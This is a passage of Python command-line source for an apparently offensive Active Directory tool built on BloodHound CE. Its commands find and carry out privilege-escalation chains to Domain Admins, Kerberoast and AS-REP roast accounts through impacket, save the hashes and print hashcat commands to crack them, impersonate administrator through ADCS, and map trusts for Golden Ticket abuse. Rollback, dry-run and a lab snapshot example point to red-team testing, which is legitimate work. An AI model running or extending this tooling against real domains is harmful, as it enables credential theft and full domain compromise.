                        skipped_total += 1
                        continue
                    if dedup == "edge":
                        dedup_key = (edge_type,)
                    elif dedup == "none":
                        dedup_key = (source, edge_type, target_name)
                    else:  # "edge-target" (default)
                        dedup_key = (edge_type, target_name)
                    if dedup_key in seen:
                        continue
                    seen.add(dedup_key)
                    tests.append({
                        "edge": edge_type,
                        "source": source,
                        "target": target_name,
                        "target_label": target_kind or "Base",
                        "live": live,
                        "destructive": edge_type not in _READ_ONLY_EDGES,
                        "props": {},
                    })
                    count += 1
                if count:
                    console.print(f"[dim]  {source}: {count} edge(s)[/]")
        return tests

    try:
        tests = asyncio.run(_discover())
    except Exception as exc:
        console.print(f"[bold red]Discovery error:[/] {exc}")
        raise typer.Exit(code=1) from exc

    if not tests:
        console.print("[yellow]No exploitable outbound edges found for the held principals.[/]")
        raise typer.Exit(code=1)

    plan = {"revert_cmd": revert_cmd, "revert_settle_seconds": 60, "tests": tests}
    output.write_text(yaml.safe_dump(plan, sort_keys=False, allow_unicode=True), encoding="utf-8")
    skipped_note = f" [dim]({skipped_total} traversal edge(s) skipped)[/]" if skipped_total else ""
    console.print(
        f"\n[green]Wrote {len(tests)} discovered edge test(s) to {output}[/]{skipped_note}\n"
        f"[dim]Review it, then run:  pathstrike test-edges --plan {output}"
        f"{'' if creds_file is None else f' --creds-file {creds_file}'}[/]"
    )


# Labels that can't authenticate (you can't log in "as a group/OU/GPO").  When a
# path step's right sits on one of these, the acting identity is the user we
# currently control (a member), not the node itself.
_NON_AUTHABLE_LABELS = {"Group", "Domain", "OU", "Container", "GPO"}


@app.command(name="validate-paths")
def validate_paths(
    config: ConfigOption = None,
    source: SourceOption = None,
    creds_file: Annotated[
        Optional[Path],
        typer.Option("--creds-file", help="Credential vault so each step can authenticate as the identity it pivots to."),
    ] = None,
    live: Annotated[
        bool,
        typer.Option("--live", help="Actually execute each step. Default is dry-run."),
    ] = False,
    max_targets: Annotated[
        int,
        typer.Option("--max-targets", help="Cap how many high-value targets to attempt paths to."),
    ] = 25,
    revert_cmd: Annotated[
        str,
        typer.Option("--revert-cmd", help="Snapshot-revert hook run BEFORE each path (so every chain starts clean)."),
    ] = "",
    output_dir: Annotated[
        Path,
        typer.Option("--output", "-o", help="Directory for JSONL + summary logs."),
    ] = Path("test_results"),
    verbose: VerboseOption = False,
) -> None:
    """Validate ESCALATION CHAINS end-to-end: does a path reach a higher principal?

    Discovers the shortest exploitable path from [bold]source[/] (default: the
    config foothold) to each high-value target (Domain Admins / Tier Zero), then
    walks each step live — modelling the identity pivot along the chain (after
    taking over a user/computer, subsequent steps act as that identity; rights
    held via a group are exercised as the member we control).

    Unlike [bold]campaign[/], it does NOT abort the whole run at the first broken
    step — it records exactly which link fails and how far each chain got, then
    moves to the next path.  That's the data for "do the escalations actually
    work end-to-end."

    [bold]Example[/]:
      pathstrike validate-paths --creds-file creds/north.ntds --live \\
        --revert-cmd 'cd ~/GOAD && vagrant snapshot restore clean'
    """
    setup_logging(verbose=verbose)
    cfg = _load_config_or_exit(config)

    import json

    from pathstrike.bloodhound.cypher import (
        build_high_value_nodes_query,
        build_shortest_path_to_target_query,
    )
    from pathstrike.bloodhound.parser import parse_cypher_response
    from pathstrike.engine.edge_tester import execute_edge_test

    cred_store = _seed_credential_store(cfg, extra_vault=creds_file)
    domain = cfg.domain.name
    foothold = source or f"{cfg.credentials.username}@{domain}".upper()

    output_dir.mkdir(parents=True, exist_ok=True)
    ts = datetime.now(timezone.utc).strftime("%Y%m%d_%H%M%S")
    jsonl_path = output_dir / f"path_validation_{ts}.jsonl"
    summary_path = output_dir / f"path_validation_{ts}.summary.json"

    console.print(f"[bold]Validating escalation chains from {foothold} in {domain.upper()}[/]")
    console.print(f"[dim]Mode: {'LIVE' if live else 'dry-run'} -> {jsonl_path}[/]\n")

    async def _run() -> list[dict]:
        path_summaries: list[dict] = []
        with open(jsonl_path, "w", encoding="utf-8") as fh:
            async with BloodHoundClient.connect(cfg.bloodhound) as client:
                # 1. High-value targets
                hv_query, _ = build_high_value_nodes_query(domain)
                try:
                    hv_resp = await client.cypher_query(hv_query)
                except Exception as exc:
                    console.print(f"[bold red]High-value target query failed:[/] {exc}")
                    return []
                targets = [
                    lit["value"]
                    for lit in hv_resp.get("data", {}).get("literals", []) or []
                    if lit.get("key") == "name" and lit.get("value") and lit["value"] != foothold
                ]
                targets = sorted(set(targets))[:max_targets]
                if not targets:
                    console.print("[yellow]No high-value targets found in this domain.[/]")
                    return []
                console.print(f"[dim]{len(targets)} high-value target(s) to attempt.[/]\n")

                # 2. Per target: shortest path, then walk it
                for tgt in targets:
                    pq, _ = build_shortest_path_to_target_query(foothold, tgt)
                    try:
                        presp = await client.cypher_query(pq)
                        paths = parse_cypher_response(presp)
                    except Exception:
                        paths = []
                    if not paths:
                        console.print(f"[dim]· {tgt}: no exploitable path[/]")
                        continue

                    path = paths[0]
                    if revert_cmd and live:
                        await _run_revert(revert_cmd, 60)

                    current = foothold          # identity we control right now
                    steps_out: list[dict] = []
                    action_total = 0
                    reached = 0
                    broke_at = None

                    for i, step in enumerate(path.steps):
                        et = step.edge.edge_type
                        src_node, tgt_node = step.edge.source, step.edge.target

                        # Traversal hops don't run a tool — they just move context.
                        if et in _NON_ACTIONABLE_EDGES:
                            steps_out.append({"index": i, "edge_type": et,
                                              "target": tgt_node.name, "kind": "traversal"})
                            continue

                        action_total += 1
                        # Who/what to pass as the edge source:
                        #  * GPO source (GPLink/WriteGPLink): the handler abuses
                        #    the GPO *object* itself (reads its name from the
                        #    source node), so the real GPO must be preserved —
                        #    auth falls back to the foothold identity that took
                        #    control of it in the prior step.
                        #  * Other non-authable sources (Group/Domain/OU): a
                        #    right held via the object is exercised as the member
                        #    we currently control.
                        #  * User/Computer source: act as that principal.
                        if src_node.label == "GPO":
                            acting = src_node.name
                        elif src_node.label in _NON_AUTHABLE_LABELS:
                            acting = current
                        else:
                            acting = src_node.name

                        res = await execute_edge_test(
                            cfg, client, cred_store,
                            edge_type=et, target=tgt_node.name, source=acting,
                            live=live, props=dict(step.edge.properties or {}),
                            source_label=src_node.label or "User",
                            target_label=tgt_node.label or "Base",
                        )
                        res["path_target"] = tgt
                        res["path_step"] = i
                        res["acting_as"] = acting
                        fh.write(json.dumps(res) + "\n"); fh.flush()
                        steps_out.append({"index": i, "edge_type": et, "target": tgt_node.name,
                                          "acting_as": acting, "outcome": res["outcome"]})

                        if res["outcome"] == "success":
                            reached += 1
                            # Pivot: taking over a user/computer makes us that identity.
                            if tgt_node.label in {"User", "Computer"}:
                                current = tgt_node.name
                        else:
                            broke_at = {"step": i, "edge_type": et, "target": tgt_node.name,
                                        "outcome": res["outcome"], "error": res.get("error_category"),
                                        "msg": res.get("result_msg", "")[:160]}
                            break

                    full = broke_at is None and action_total > 0
                    summary = {"target": tgt, "source": foothold,
                               "action_steps": action_total, "succeeded": reached,
                               "full_success": full, "broke_at": broke_at, "steps": steps_out}
                    path_summaries.append(summary)

                    # Console line per path
                    if full:
                        console.print(f"[bold green]✅ {tgt}[/] — full chain ({reached}/{action_total} steps)")
                    elif broke_at:
                        console.print(
                            f"[bold red]❌ {tgt}[/] — broke at step {broke_at['step']} "
                            f"[yellow]{broke_at['edge_type']}[/] -> {broke_at['target']} "
                            f"[dim]({broke_at['outcome']}{'/' + broke_at['error'] if broke_at['error'] else ''})[/] "
                            f"[dim]· {reached}/{action_total} ok[/]"
                        )
                    else:
                        console.print(f"[dim]· {tgt}: no actionable steps[/]")
        return path_summaries

    try:
        summaries = asyncio.run(_run())
    except Exception as exc:
        console.print(f"[bold red]Validation error:[/] {exc}")
        raise typer.Exit(code=1) from exc

    full = sum(1 for s in summaries if s["full_success"])
    broken = sum(1 for s in summaries if s["broke_at"])
    console.print(
        f"\n[bold]Chains: {len(summaries)} attempted · "
        f"[green]{full} full[/] · [red]{broken} broke[/][/]"
    )
    summary_obj = {
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "source": foothold, "domain": domain, "mode": "live" if live else "dry_run",
        "chains_attempted": len(summaries), "chains_full": full, "chains_broken": broken,
        "paths": summaries,
    }
    summary_path.write_text(json.dumps(summary_obj, indent=2), encoding="utf-8")
    console.print(f"[green]Log:[/] {jsonl_path}\n[green]Summary:[/] {summary_path}")


@app.command()
def verify(
    config: ConfigOption = None,
    verbose: VerboseOption = False,
) -> None:
    """Test BloodHound CE connectivity, external tools, and time offset."""
    setup_logging(verbose=verbose)
    cfg = _load_config_or_exit(config)

    # ---- External tool checks ----
    tools = {
        "bloodyAD": "bloodyAD",
        "impacket (secretsdump)": "secretsdump.py",
        "impacket (getST)": "getST.py",
        "certipy": "certipy",
        "netexec": "netexec",
        "pyGPOAbuse": "pygpoabuse",
        "impacket (ntlmrelayx)": "ntlmrelayx.py",
        "ntpdate (time sync)": "ntpdate",
        "faketime (skew fallback)": "faketime",
    }

    tool_table = Table(
        title="External Tools",
        show_header=True,
        header_style="bold cyan",
    )
    tool_table.add_column("Tool", style="bold")
    tool_table.add_column("Binary", style="dim")
    tool_table.add_column("Status")

    for name, binary in tools.items():
        found = shutil.which(binary)
        if found:
            tool_table.add_row(name, binary, f"[green]found[/] ({found})")
        else:
            tool_table.add_row(name, binary, "[red]not found[/]")

    console.print(tool_table)
    console.print()

    # ---- Time offset check ----
    console.print("[bold]Checking time offset with DC...[/]")

    async def _check_time() -> float | None:
        from pathstrike.engine.time_sync import check_time_offset

        return await check_time_offset(cfg.domain.dc_host, cfg.domain.dc_fqdn)

    offset = asyncio.run(_check_time())
    if offset is not None:
        abs_offset = abs(offset)
        if abs_offset <= 300:
            console.print(
                f"[bold green]Time offset:[/] {offset:.1f}s "
                f"(within Kerberos 5-min tolerance) ✅"
            )
        else:
            console.print(
                f"[bold red]Time offset:[/] {offset:.1f}s "
                f"(EXCEEDS Kerberos 5-min tolerance!) ❌\n"
                f"  Run [bold]pathstrike timesync[/] or "
                f"[bold]sudo ntpdate {cfg.domain.dc_fqdn or cfg.domain.dc_host}[/]"
            )
    else:
        console.print(
            "[yellow]Could not measure time offset[/] "
            "(ntpdate not available or DC unreachable)"
        )
    console.print()

    # ---- BloodHound CE connectivity ----
    console.print(f"[bold]Connecting to BH CE:[/] {cfg.bloodhound.base_url}")

    async def _check() -> bool:
        async with BloodHoundClient.connect(cfg.bloodhound) as client:
            return await client.check_connection()

    try:
        connected = asyncio.run(_check())
    except ValueError as exc:
        # Invalid API key (bad base64, placeholder values, etc.)
        console.print(
            f"[bold red]BloodHound CE config error:[/] {exc}\n"
            "[dim]Update token_id and token_key in your pathstrike.yaml "
            "(Settings → API Keys in BH CE)[/]"
        )
        raise typer.Exit(code=1) from exc
    except Exception as exc:
        console.print(f"[bold red]BloodHound CE connection FAILED:[/] {exc}")
        raise typer.Exit(code=1) from exc

    if connected:
        console.print("[bold green]BloodHound CE connection successful.[/]")
    else:
        console.print("[bold red]BloodHound CE connection FAILED.[/]")
        raise typer.Exit(code=1)


@app.command()
def timesync(
    config: ConfigOption = None,
    verbose: VerboseOption = False,
    check_only: Annotated[
        bool,
        typer.Option(
            "--check", help="Only check the time offset, don't sync"
        ),
    ] = False,
) -> None:
    """Synchronise the local clock with the Domain Controller.

    Kerberos requires clocks to be within 5 minutes.  This command uses
    ``ntpdate`` (or chronyd/rdate as fallbacks) to sync your attacker
    machine with the target DC.

    [bold yellow]Requires sudo[/] for clock modification.

    Example:
        pathstrike timesync              # sync with DC
        pathstrike timesync --check      # check offset without syncing
    """
    setup_logging(verbose=verbose)
    cfg = _load_config_or_exit(config)

    dc_host = cfg.domain.dc_host
    dc_fqdn = cfg.domain.dc_fqdn
    target = dc_fqdn or dc_host

    if check_only:
        console.print(f"[bold]Checking time offset with {target}...[/]")

        async def _check_offset() -> float | None:
            from pathstrike.engine.time_sync import check_time_offset

            return await check_time_offset(dc_host, dc_fqdn)

        offset = asyncio.run(_check_offset())
        if offset is not None:
            abs_offset = abs(offset)
            direction = "ahead" if offset > 0 else "behind"
            console.print(
                f"\n[bold]Offset:[/] {offset:.3f}s ({direction} the DC)"
            )
            if abs_offset <= 300:
                console.print(
                    "[bold green]✅ Within Kerberos tolerance (5 min)[/]"
                )
            else:
                console.print(
                    "[bold red]❌ EXCEEDS Kerberos tolerance![/]\n"
                    f"  Run: [bold]pathstrike timesync[/] to fix"
                )
                raise typer.Exit(code=1)
        else:
            console.print(
                "[yellow]Could not measure offset. "
                "Ensure ntpdate is installed and DC is reachable.[/]"
            )
            raise typer.Exit(code=1)
    else:
        console.print(f"[bold]Syncing clock with {target}...[/]")

        async def _sync() -> None:
            from pathstrike.engine.time_sync import sync_time

            result = await sync_time(dc_host, dc_fqdn)
            if result.success:
                console.print(
                    f"\n[bold green]✅ {result.message}[/]"
                )
                if result.offset_seconds is not None:
                    console.print(
                        f"  Corrected offset: {result.offset_seconds:.3f}s"
                    )
            else:
                console.print(
                    f"\n[bold red]❌ {result.message}[/]\n\n"
                    f"Manual fix:\n"
                    f"  [bold]sudo ntpdate {target}[/]\n"
                    f"  [bold]sudo chronyd -q 'server {target} iburst'[/]"
                )
                raise typer.Exit(code=1)

        asyncio.run(_sync())


@app.command()
def rollback(
    log_file: Annotated[
        Optional[Path],
        typer.Argument(
            help="Path to the rollback JSON log file. If omitted, uses the most recent log from rollback_logs/.",
        ),
    ] = None,
    config: ConfigOption = None,
    dry_run: Annotated[
        bool,
        typer.Option(
            "--dry-run",
            help="Show what rollback commands WOULD be executed without running them",
        ),
    ] = False,
    force: Annotated[
        bool,
        typer.Option(
            "--force",
            help="Continue rolling back remaining actions even if some fail",
        ),
    ] = False,
    verbose: VerboseOption = False,
) -> None:
    """Undo actions recorded in a rollback log file.

    If no LOG_FILE is given, the most recent log from ``rollback_logs/``
    is used automatically.

    Use ``--dry-run`` to preview what commands would be executed.
    Use ``--force`` to continue even if individual rollback actions fail.
    """
    setup_logging(verbose=verbose)
    cfg = _load_config_or_exit(config)

    # Resolve log file: explicit argument or auto-discover latest
    if log_file is None:
        log_file = _find_latest_rollback_log()
        if log_file is None:
            console.print(
                "[bold red]No rollback log specified and no logs found in "
                "rollback_logs/.[/]\n"
                "[dim]Run an attack first, or pass a log file explicitly: "
                "pathstrike rollback <log_file>[/]"
            )
            raise typer.Exit(code=1)
        console.print(f"[dim]Using latest rollback log:[/] {log_file}\n")
    elif not log_file.exists():
        console.print(f"[bold red]Rollback log not found:[/] {log_file}")
        raise typer.Exit(code=1)

    try:
        mgr = RollbackManager.load_from_file(log_file, cfg)
    except (FileNotFoundError, Exception) as exc:
        console.print(f"[bold red]Failed to load rollback log:[/] {exc}")
        raise typer.Exit(code=1) from exc

    pending = mgr.get_pending_actions()

    if not pending:
        console.print("[yellow]No pending rollback actions found.[/]")
        return

    table = Table(
        title="Pending Rollback Actions",
        show_header=True,
        header_style="bold cyan",
    )
    table.add_column("Step", justify="right", width=5)
    table.add_column("Action", style="bold")
    table.add_column("Description")
    table.add_column("Command", style="dim")

    for action in pending:
        table.add_row(
            str(action.step_index),
            action.action_type,
            action.description,
            action.command,
        )

    console.print(table)
    console.print(
        f"\n[bold yellow]{len(pending)} action(s) to roll back.[/]"
    )

    if dry_run:
        # Show dry-run preview
        dry_run_results = mgr.dry_run_rollback()
        console.print("\n[bold cyan]Dry-run preview:[/]\n")
        for entry in dry_run_results:
            console.print(
                f"  [dim]Step {entry['step_index']}:[/] "
                f"[bold]{entry['description']}[/]\n"
                f"    Command: [dim]{entry['command']}[/]"
            )
        console.print(
            f"\n[dim]{len(dry_run_results)} action(s) would be executed.[/]"
        )
        return

    # Execute rollback
    async def _run_rollback() -> list[dict]:
        return await mgr.rollback_all(force=force)

    results = asyncio.run(_run_rollback())

    # Display results
    result_table = Table(
        title="Rollback Results",
        show_header=True,
        header_style="bold cyan",
    )
    result_table.add_column("Step", justify="right", width=5)
    result_table.add_column("Description")
    result_table.add_column("Status")

    for result in results:
        status = "[bold green]OK[/]" if result["success"] else "[bold red]FAILED[/]"
        result_table.add_row(
            str(result["step_index"]),
            result["description"],
            status,
        )

    console.print(result_table)

    succeeded = sum(1 for r in results if r["success"])
    failed = len(results) - succeeded
    if failed:
        console.print(
            f"\n[bold red]{failed} rollback action(s) failed.[/]"
        )
        # Show failed rollbacks
        failed_rollbacks = mgr.get_failed_rollbacks()
        if failed_rollbacks:
            console.print("[bold yellow]Failed rollbacks:[/]")
            for fr in failed_rollbacks:
                console.print(
                    f"  Step {fr['step_index']}: {fr['description']} -- {fr.get('error', 'unknown error')}"
                )
        raise typer.Exit(code=1)
    else:
        console.print(
            f"\n[bold green]All {succeeded} rollback action(s) succeeded.[/]"
        )


@app.command(name="checkpoints")
def list_checkpoints(
    verbose: VerboseOption = False,
) -> None:
    """List all saved attack path checkpoints.

    Checkpoints are created automatically during attack execution and can
    be used to resume failed paths with ``pathstrike attack --resume <file>``.
    """
    setup_logging(verbose=verbose)

    mgr = CheckpointManager()
    checkpoints = mgr.list_checkpoints()

    if not checkpoints:
        console.print("[yellow]No checkpoints found.[/]")
        console.print(
            "[dim]Checkpoints are created automatically during attack execution.[/]"
        )
        return

    table = Table(
        title="Attack Path Checkpoints",
        show_header=True,
        header_style="bold cyan",
    )
    table.add_column("Source", style="green")
    table.add_column("Target", style="red")
    table.add_column("Status", style="bold")
    table.add_column("Progress")
    table.add_column("Updated", style="dim")
    table.add_column("File", style="dim")

    for cp in checkpoints:
        status = cp["status"]
        if status == "completed":
            status_style = "[bold green]completed[/]"
        elif status == "failed":
            status_style = "[bold red]failed[/]"
        elif status == "in_progress":
            status_style = "[bold yellow]in_progress[/]"
        else:
            status_style = status

        progress = f"{cp['completed_steps']}/{cp['total_steps']}"

        table.add_row(
            cp["source"],
            cp["target"],
            status_style,
            progress,
            cp["updated_at"],
            cp["file"],
        )

    console.print(table)
    console.print(
        f"\n[dim]Total: {len(checkpoints)} checkpoint(s)[/]\n"
        "[dim]Resume a failed path: pathstrike attack --resume <checkpoint-file> -s <source>[/]"
    )


@app.command()
def kerberoast(
    config: ConfigOption = None,
    output: Annotated[
        Optional[Path],
        typer.Option("--output", "-o", help="Write hashes to file"),
    ] = None,
    verbose: VerboseOption = False,
) -> None:
    """Discover Kerberoastable users via BloodHound CE and extract TGS hashes.

    Queries BH CE for enabled users with SPNs, then runs GetUserSPNs.py
    to extract TGS tickets that can be cracked offline.

    Use ``-o hashes.txt`` to save hashes in hashcat-compatible format.
    """
    setup_logging(verbose=verbose)
    cfg = _load_config_or_exit(config)
    domain = cfg.domain.name

    from pathstrike.handlers.kerberos import (
        discover_kerberoastable_users,
        run_kerberoast,
    )

    async def _run():
        async with BloodHoundClient.connect(cfg.bloodhound) as client:
            # Step 1: Discover
            console.print(f"[bold]Querying BH CE for Kerberoastable users in {domain.upper()}...[/]")
            users = await discover_kerberoastable_users(client, domain)

            if not users:
                console.print("[yellow]No Kerberoastable users found.[/]")
                return

            console.print(f"Found [bold green]{len(users)}[/] Kerberoastable user(s):\n")
            for u in users:
                console.print(f"  - {u['name']}")
            console.print()

            # Step 2: Attack
            console.print("[bold]Extracting TGS hashes via GetUserSPNs.py...[/]\n")
            hashes = await run_kerberoast(cfg, target_users=users)

            if not hashes:
                console.print("[yellow]No TGS hashes extracted.[/]")
                return

            console.print(f"[bold green]Extracted {len(hashes)} TGS hash(es):[/]\n")
            for h in hashes:
                console.print(f"[dim]{h['hash'][:120]}...[/]")

            # Step 3: Output
            if output:
                with open(output, "w") as fh:
                    for h in hashes:
                        fh.write(h["hash"] + "\n")
                console.print(f"\n[green]Hashes written to {output}[/]")
                console.print(f"Crack with: [bold]hashcat -m 13100 {output} wordlist.txt[/]")
            else:
                console.print("\nUse [bold]-o hashes.txt[/] to save, then:")
                console.print("[bold]hashcat -m 13100 hashes.txt wordlist.txt[/]")

    try:
        asyncio.run(_run())
    except Exception as exc:
        console.print(f"[bold red]Error:[/] {exc}")
        raise typer.Exit(code=1) from exc


@app.command()
def asreproast(
    config: ConfigOption = None,
    output: Annotated[
        Optional[Path],
        typer.Option("--output", "-o", help="Write hashes to file"),
    ] = None,
    verbose: VerboseOption = False,
) -> None:
    """Discover AS-REP roastable users via BloodHound CE and extract hashes.

    Queries BH CE for enabled users with DONT_REQUIRE_PREAUTH, then runs
    GetNPUsers.py to extract AS-REP hashes that can be cracked offline.

    Use ``-o hashes.txt`` to save hashes in hashcat-compatible format.
    """
    setup_logging(verbose=verbose)
    cfg = _load_config_or_exit(config)
    domain = cfg.domain.name

    from pathstrike.handlers.kerberos import (
        discover_asrep_roastable_users,
        run_asreproast,
    )

    async def _run():
        async with BloodHoundClient.connect(cfg.bloodhound) as client:
            # Step 1: Discover
            console.print(f"[bold]Querying BH CE for AS-REP roastable users in {domain.upper()}...[/]")
            users = await discover_asrep_roastable_users(client, domain)

            if not users:
                console.print("[yellow]No AS-REP roastable users found.[/]")
                return

            console.print(f"Found [bold green]{len(users)}[/] AS-REP roastable user(s):\n")
            for u in users:
                console.print(f"  - {u['name']}")
            console.print()

            # Step 2: Attack
            console.print("[bold]Extracting AS-REP hashes via GetNPUsers.py...[/]\n")
            hashes = await run_asreproast(cfg, target_users=users)

            if not hashes:
                console.print("[yellow]No AS-REP hashes extracted.[/]")
                return

            console.print(f"[bold green]Extracted {len(hashes)} AS-REP hash(es):[/]\n")
            for h in hashes:
                console.print(f"[dim]{h['hash'][:120]}...[/]")

            # Step 3: Output
            if output:
                with open(output, "w") as fh:
                    for h in hashes:
                        fh.write(h["hash"] + "\n")
                console.print(f"\n[green]Hashes written to {output}[/]")
                console.print(f"Crack with: [bold]hashcat -m 18200 {output} wordlist.txt[/]")
            else:
                console.print("\nUse [bold]-o hashes.txt[/] to save, then:")
                console.print("[bold]hashcat -m 18200 hashes.txt wordlist.txt[/]")

    try:
        asyncio.run(_run())
    except Exception as exc:
        console.print(f"[bold red]Error:[/] {exc}")
        raise typer.Exit(code=1) from exc


@app.command()
def domains(
    config: ConfigOption = None,
    verbose: VerboseOption = False,
) -> None:
    """List all AD domains discovered by BloodHound CE.

    Shows domain names, SIDs, and data collection timestamps.
    Auto-detects available targets for attack planning.
    """
    setup_logging(verbose=verbose)
    cfg = _load_config_or_exit(config)

    async def _run():
        async with BloodHoundClient.connect(cfg.bloodhound) as client:
            raw_domains = await client.get_available_domains()

            if not raw_domains:
                console.print("[yellow]No domains found in BloodHound CE.[/]")
                return

            table = Table(title="Discovered Domains")
            table.add_column("Domain", style="green")
            table.add_column("ID / SID", style="cyan")
            table.add_column("Type", style="yellow")
            table.add_column("Collected", style="dim")

            for d in raw_domains:
                name = d.get("name", d.get("label", "Unknown"))
                sid = d.get("id", d.get("objectid", ""))
                dtype = d.get("type", "AD")
                collected = d.get("collected", d.get("last_collected", ""))
                table.add_row(name, sid, dtype, str(collected))

            console.print(table)
            console.print(
                f"\n[dim]Configure target domain in pathstrike.yaml → domain.name[/]"
            )

    try:
        asyncio.run(_run())
    except Exception as exc:
        console.print(f"[bold red]Error:[/] {exc}")
        raise typer.Exit(code=1) from exc


@app.command()
def auto(
    source: SourceOption = None,
    config: ConfigOption = None,
    mode: Annotated[
        ExecutionMode,
        typer.Option("--mode", "-m", help="Execution mode: interactive, auto, or dry_run"),
    ] = ExecutionMode.interactive,
    max_retries: Annotated[
        int,
        typer.Option("--max-retries", help="Max retries per step"),
    ] = -1,
    max_targets: Annotated[
        int,
        typer.Option("--max-targets", help="Max reachable targets to pursue per round"),
    ] = 10,
    max_depth: Annotated[
        int,
        typer.Option("--max-depth", help="Maximum path depth when enumerating reachable targets"),
    ] = 10,
    no_time_sync: Annotated[
        bool,
        typer.Option("--no-time-sync", help="Disable automatic ntpdate clock sync"),
    ] = False,
    impersonate: Annotated[
        Optional[str],
        typer.Option(
            "--impersonate",
            help=(
                "Principal to impersonate via SAN when an ADCS edge fires. "
                "Overrides ``target.adcs_impersonate`` from the config. "
                "Defaults to the configured value (which itself defaults to "
                "``administrator``)."
            ),
        ),
    ] = None,
    verbose: VerboseOption = False,
) -> None:
    """Greedy reachable-targets exploitation — escalate as far as possible.

    Enumerates every exploitable node reachable from the source (users,
    groups, computers, domains) via handler-backed edges, [bold]without[/]
    restricting to high-value principals.  This lets PathStrike pivot
    through intermediate targets — e.g. a non-admin group that has
    GenericWrite over a service account, which in turn owns the DC.

    After each successful escalation, re-queries from the new identity
    to discover additional reachable nodes, chaining opportunistically
    until nothing new is exploitable.

    Use [bold]pathstrike campaign[/] instead when you specifically want
    to drive toward Domain Admin / Enterprise Admin / Tier Zero.
    """
    setup_logging(verbose=verbose)
    cfg = _load_config_or_exit(config)

    if impersonate:
        cfg.target.adcs_impersonate = impersonate

    source_name = _build_source_name(source, cfg)

    retry_policy = _build_retry_policy(cfg)
    if max_retries >= 0:
        retry_policy.max_retries = max_retries

    if no_time_sync or not cfg.execution.auto_time_sync:
        from pathstrike.engine.error_handler import ErrorCategory
        retry_on = set(retry_policy.retry_on)
        retry_on.discard(ErrorCategory.TIME_SKEW)
        retry_policy.retry_on = frozenset(retry_on)

    console.print(
        f"[bold]Auto Mode (reachable-targets):[/] {mode.value}\n"
        f"[bold]Source:[/] {source_name}\n"
        f"[bold]Max targets per round:[/] {max_targets}\n"
        f"[bold]Max path depth:[/] {max_depth}\n"
        f"[bold]Max retries:[/] {retry_policy.max_retries}\n"
        f"[bold]Auto time sync:[/] {'disabled' if no_time_sync else 'enabled'}\n"
        f"[bold]ADCS impersonate:[/] {cfg.target.adcs_impersonate}\n"
    )

    async def _run():
        async with BloodHoundClient.connect(cfg.bloodhound) as client:
            cred_store = _seed_credential_store(cfg)
            rollback_mgr = RollbackManager(cfg)

            from pathstrike.engine.campaign import CampaignOrchestrator

            auto_orch = CampaignOrchestrator(
                config=cfg,
                bh_client=client,
                cred_store=cred_store,
                rollback_mgr=rollback_mgr,
                retry_policy=retry_policy,
                mode=mode,
                verbose=verbose,
                max_targets=max_targets,
                reachable_mode=True,
                max_depth=max_depth,
            )

            result = await auto_orch.run_campaign()
            _save_rollback_log(rollback_mgr, "auto")

            if not result.targets_compromised and mode != ExecutionMode.dry_run:
                raise typer.Exit(code=1)

    try:
        asyncio.run(_run())
    except (ValueError, typer.Exit) as exc:
        if isinstance(exc, ValueError):
            console.print(f"[bold red]Config error:[/] {exc}")
        raise typer.Exit(code=1) from exc
    except Exception as exc:
        console.print(f"[bold red]Error:[/] {exc}")
        raise typer.Exit(code=1) from exc


@app.command()
def credentials(
    config: ConfigOption = None,
) -> None:
    """Interactively update credentials in the config file.

    Prompts for username, password, domain, and DC host.
    Press Enter to keep the current value.
    """
    import yaml

    # Locate config file
    config_path = config
    if config_path is None:
        config_path = find_config()
        if config_path is None:
            console.print("[bold red]No config file found.[/]")
            raise typer.Exit(code=1)

    config_path = Path(config_path).expanduser().resolve()
    console.print(f"[dim]Editing:[/] {config_path}\n")

    # Load raw YAML (preserve structure)
    with open(config_path, "r") as fh:
        raw = yaml.safe_load(fh)

    creds = raw.get("credentials", {})
    domain_cfg = raw.get("domain", {})

    # Show current values and prompt for new ones
    cur_user = creds.get("username", "")
    cur_pass = creds.get("password", "")
    cur_domain = domain_cfg.get("name", "")
    cur_dc = domain_cfg.get("dc_host", "")
    cur_dc_fqdn = domain_cfg.get("dc_fqdn", "")

    console.print("[bold]Current credentials:[/]")
    console.print(f"  Username: [green]{cur_user}[/]")
    console.print(f"  Password: [green]{'*' * len(cur_pass) if cur_pass else '(none)'}[/]")
    console.print(f"  Domain:   [green]{cur_domain}[/]")
    console.print(f"  DC Host:  [green]{cur_dc}[/]")
    console.print(f"  DC FQDN:  [green]{cur_dc_fqdn}[/]")
    console.print("\n[dim]Press Enter to keep current value.[/]\n")

    new_user = typer.prompt("Username", default=cur_user).strip()
    new_pass = typer.prompt("Password", default=cur_pass).strip()
    new_domain = typer.prompt("Domain", default=cur_domain).strip()
    new_dc = typer.prompt("DC Host (IP)", default=cur_dc).strip()
    new_dc_fqdn = typer.prompt("DC FQDN", default=cur_dc_fqdn).strip()

    # Update raw config
    if "credentials" not in raw:
        raw["credentials"] = {}
    raw["credentials"]["username"] = new_user
    raw["credentials"]["password"] = new_pass

    if "domain" not in raw:
        raw["domain"] = {}
    raw["domain"]["name"] = new_domain
    raw["domain"]["dc_host"] = new_dc
    if new_dc_fqdn:
        raw["domain"]["dc_fqdn"] = new_dc_fqdn

    # Write back
    with open(config_path, "w") as fh:
        yaml.dump(raw, fh, default_flow_style=False, sort_keys=False)

    console.print(f"\n[bold green]Config updated:[/] {config_path}")
    console.print(f"  Username: [green]{new_user}[/]")
    console.print(f"  Domain:   [green]{new_domain}[/]")
    console.print(f"  DC Host:  [green]{new_dc}[/]")


@app.command()
def trusts(
    config: ConfigOption = None,
    verbose: VerboseOption = False,
) -> None:
    """Enumerate domain trust relationships from BloodHound CE.

    Queries the BH CE graph for all ``TrustedBy`` edges between Domain
    nodes and displays the trust map.  Identifies child→parent trusts
    that are exploitable via Golden Ticket with SID History injection.
    """
    setup_logging(verbose=verbose)
    cfg = _load_config_or_exit(config)

    from pathstrike.bloodhound.cypher import build_trust_map_query

    async def _run():
        async with BloodHoundClient.connect(cfg.bloodhound) as client:
            console.print("[bold]Querying BH CE for domain trusts...[/]\n")
            query, _ = build_trust_map_query()

            try:
                response = await client.cypher_query(query)
            except Exception as exc:
                console.print(f"[red]Cypher query failed: {exc}[/]")
                return

            raw_data = response.get("data", {})
            if not raw_data:
                console.print("[yellow]No trust relationships found.[/]")
                return

            # Parse nodes and edges
            nodes_data = {}
            edges_data = []
            if isinstance(raw_data, dict):
                nodes_data = raw_data.get("nodes", {})
                edges_data = raw_data.get("edges", [])
            elif isinstance(raw_data, list):
                for row in raw_data:
                    if isinstance(row, dict):
                        nodes_data.update(row.get("nodes", {}))
